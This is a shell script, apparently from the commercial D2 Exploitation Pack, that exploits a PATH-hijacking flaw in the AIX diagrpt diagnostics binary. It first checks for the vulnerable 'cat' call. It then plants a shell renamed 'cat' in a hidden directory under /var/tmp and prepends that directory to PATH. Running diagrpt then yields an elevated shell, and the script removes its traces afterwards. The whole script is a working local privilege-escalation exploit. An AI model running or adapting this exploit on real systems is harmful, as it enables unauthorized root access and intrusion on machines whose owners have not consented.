#!/bin/sh

# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007

DIAGRPT="/usr/lpp/diagnostics/bin/diagrpt"
CHECKVULN=`strings $DIAGRPT | grep cat | grep '%s'`
MKDIR="/usr/bin/mkdir"
TMP="/var/tmp/.b$$"
EXSH="$TMP/sh"
RM="/bin/rm"

if [ -z "$CHECKVULN" ]; 
then
	echo "[!] $DIAGRPT _not_ vulnerable .."
	exit
fi

$MKDIR $TMP
/usr/bin/cp ./sh $TMP/sh
/usr/bin/chmod 755 $TMP/sh
/usr/bin/cp ./sh $TMP/cat
/usr/bin/chmod 755 $TMP/cat

PATH=$TMP:$PATH 
export PATH
DIAGDATADIR=$TMP
export DIAGDATADIR

/usr/bin/touch $TMP/diagrpt1.dat

$DIAGRPT -o 010101
$EXSH 

cd /var/tmp && $RM -fr $TMP
